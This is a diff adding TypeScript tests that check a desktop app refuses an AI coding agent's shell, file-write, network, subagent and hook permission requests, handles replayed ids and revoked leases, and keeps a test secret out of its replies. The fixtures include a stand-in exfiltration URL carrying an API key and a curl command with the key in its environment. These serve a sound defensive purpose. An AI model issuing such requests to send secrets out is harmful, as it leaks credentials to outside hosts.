@@ -29,6 +29,7 @@ import {
 import { createProcessSpawnAuthority } from '../../../main/enterprise/spawn-authority';
 import type {
 	ManagedEffect,
+	ManagedEffectAuthority,
 	ManagedEffectBinding,
 } from '../../../shared/maestro-lib/managed/effects';
 import { fakeSpawnPort, tableEffects } from '../../helpers/managedSpawnPort';
@@ -48,6 +49,16 @@ import type {
 import { createManagedHostAdapter } from '../../../shared/maestro-lib/managed/host-adapter';
 import { inProcessContext } from '../../../shared/maestro-lib/managed/operations';
 import { startFakeEndpoint, type FakeEndpoint } from './fakeEndpoint';
+import { GrokAcpClient } from '../../../shared/maestro-lib/grok/acp-client';
+import {
+	GrokAcpRequestAdapter,
+	type GrokAcpPermissionSettlement,
+} from '../../../shared/maestro-lib/grok/acp-requests';
+import type {
+	AcpMessage,
+	AcpRequestId,
+	GrokAcpTransportError,
+} from '../../../shared/maestro-lib/grok/acp-protocol';
 
 const T0 = Date.parse('2026-10-21T12:00:00Z');
 const INSTALLATION = {
@@ -594,5 +605,164 @@ describe('Grok effect qualification at the managed effect sinks', () => {
 			decision: 'unavailable',
 			reason: expect.stringContaining('no per-effect authorization operation'),
 		});
+	});
+});
+
+/**
+ * GT1-11-06 pass two: the managed Grok permission path composed end to end on the
+ * client side. The real ACP client and request adapter answer a synthetic peer's
+ * `session/request_permission` frames through the real desktop port's effects
+ * (`createProcessSpawnAuthority`). The inner producer is a SYNTHETIC allow-everything
+ * table; its empty `asked` list is the sentinel that no decision was made. The
+ * unqualified control proves the sentinel would have granted, so the refusal is not
+ * vacuous. Nothing here qualifies a Grok route or proves Grok's own containment.
+ */
+describe('managed Grok permission requests over the ACP wire (GT1-11-06)', () => {
+	const SECRET = 'xai-SENTINEL-ACP-2222';
+	const frame = (id: AcpRequestId, title: string, rawInput: Record<string, unknown>) => ({
+		jsonrpc: '2.0' as const,
+		id,
+		method: 'session/request_permission',
+		params: {
+			sessionId: 'native-g',
+			toolCall: { toolCallId: `tool-${id}`, title, rawInput },
+			options: [
+				{ optionId: 'yes', name: 'Allow once', kind: 'allow_once' },
+				{ optionId: 'no', name: 'Deny once', kind: 'reject_once' },
+			],
+		},
+	});
+	const REQUESTS: Array<[string, string, Record<string, unknown>]> = [
+		['native shell', 'Bash', { command: 'curl https://x', env: { XAI_API_KEY: SECRET } }],
+		['file write', 'Write', { path: '/outside/root/a.ts', content: 'x' }],
+		['network', 'WebFetch', { url: `https://exfil.example/?k=${SECRET}` }],
+		['MCP meta-tool', 'mcp__srv__fetch', { url: 'https://x' }],
+		['subagent', 'Task', { subagent_type: 'general', prompt: 'spawn a child' }],
+		['hook', 'hooks/run', { event: 'PreToolUse' }],
+	];
+	const deps = () => ({
+		installation: { installationId: 'inst-1', runtimeId: 'desktop-1', processEpoch: 'e1' },
+		identity: { read: () => ({ status: 'none' }) as const },
+		host: { policy: () => ({ sources: [], policyRevision: 3 }) },
+		dispatch: { authority: fakeSpawnPort().authority },
+		now: () => 1_000_000,
+	});
+	const tick = () => new Promise((resolve) => setImmediate(resolve));
+
+	async function wire(authority: ManagedEffectAuthority) {
+		const written: AcpMessage[] = [];
+		const settlements: GrokAcpPermissionSettlement[] = [];
+		const faults: GrokAcpTransportError[] = [];
+		const adapter = new GrokAcpRequestAdapter({
+			account: 'synthetic-account-a',
+			host: 'local',
+			cwd: '/synthetic/project',
+			processGeneration: 'process-1',
+			onSettlement: (s) => settlements.push(s as GrokAcpPermissionSettlement),
+			onFault: (error) => {
+				faults.push(error);
+				client.close(error.reason);
+			},
+		});
+		const client: GrokAcpClient = new GrokAcpClient({
+			write: (bytes) => written.push(JSON.parse(new TextDecoder().decode(bytes))),
+			requestHandlers: adapter.requestHandlers,
+			onClose: () => adapter.close(),
+		});
+		const receive = (message: unknown) =>
+			client.feedStdout(new TextEncoder().encode(JSON.stringify(message) + '\n'));
+		const initialization = client.initialize();
+		await Promise.resolve();
+		receive({ jsonrpc: '2.0', id: written[0].id, result: { protocolVersion: 1 } });
+		await initialization;
+		written.length = 0;
+		const controller = new AbortController();
+		const end = adapter.beginTurn({
+			sessionId: 'native-g',
+			turnId: 'host-g',
+			signal: controller.signal,
+			authority,
+			binding: { actor: { kind: 'human', id: 'ada' }, leaseId: 'lease-g' },
+		});
+		return { written, settlements, faults, receive, client, controller, end };
+	}
+
+	it.each(REQUESTS)(
+		'answers a %s request cancelled on the wire, refused unavailable, the producer never asked',
+		async (_label, title, rawInput) => {
+			const inner = tableEffects(() => ({ decision: 'allow' }));
+			const port = createProcessSpawnAuthority({ ...deps(), effects: inner });
+			const { written, settlements, receive, client } = await wire(port.effects!);
+			try {
+				receive(frame(7, title, rawInput));
+				await tick();
+				expect(written).toEqual([
+					{ jsonrpc: '2.0', id: 7, result: { outcome: { outcome: 'cancelled' } } },
+				]);
+				expect(settlements).toHaveLength(1);
+				expect(settlements[0]).toMatchObject({
+					requestId: 7,
+					reason: 'unavailable',
+					decision: 'unavailable',
+					responseWritten: true,
+					terminal: { status: 'refused', origin: 'effect' },
+				});
+				expect(inner.asked).toEqual([]);
+				// Redacted: neither the wire answer nor the settlement echoes the request input.
+				expect(JSON.stringify([written, settlements])).not.toContain(SECRET);
+			} finally {
+				client.close();
+			}
+		}
+	);
+
+	it('would have granted through the unqualified producer: the control the refusal is measured against', async () => {
+		const inner = tableEffects(() => ({ decision: 'allow' }));
+		const { written, settlements, receive, client } = await wire(inner);
+		try {
+			receive(frame(8, 'Bash', { command: 'ls' }));
+			await tick();
+			expect(written).toEqual([
+				{ jsonrpc: '2.0', id: 8, result: { outcome: { outcome: 'selected', optionId: 'yes' } } },
+			]);
+			expect(settlements[0]).toMatchObject({ reason: 'allowed' });
+			expect(inner.asked).toHaveLength(1);
+			expect(inner.asked[0].binding).toMatchObject({ provider: 'grok', leaseId: 'lease-g' });
+		} finally {
+			client.close();
+		}
+	});
+
+	it('refuses a replayed request id as a malformed frame and never asks a second time', async () => {
+		const inner = tableEffects(() => ({ decision: 'allow' }));
+		const port = createProcessSpawnAuthority({ ...deps(), effects: inner });
+		const { written, settlements, faults, receive, client } = await wire(port.effects!);
+		receive(frame(9, 'Write', { path: '/p/a.ts' }));
+		await tick();
+		receive(frame(9, 'Write', { path: '/p/a.ts' }));
+		await tick();
+		expect(written).toHaveLength(1);
+		expect(settlements).toHaveLength(1);
+		expect(faults.map((f) => f.reason)).toEqual(['malformed-frame']);
+		expect(client.isClosed).toBe(true);
+		expect(inner.asked).toEqual([]);
+	});
+
+	it('answers nothing granted once the turn is stopped (lease revoked) before the request lands', async () => {
+		const inner = tableEffects(() => ({ decision: 'allow' }));
+		const { written, settlements, receive, controller, client } = await wire(inner);
+		try {
+			// The desktop stops the turn when its lease is revoked; the next request is late.
+			controller.abort();
+			receive(frame(10, 'Bash', { command: 'ls' }));
+			await tick();
+			expect(written).toEqual([
+				{ jsonrpc: '2.0', id: 10, result: { outcome: { outcome: 'cancelled' } } },
+			]);
+			expect(settlements[0]).toMatchObject({ reason: 'stale-request' });
+			expect(inner.asked).toEqual([]);
+		} finally {
+			client.close();
+		}
 	});
 });
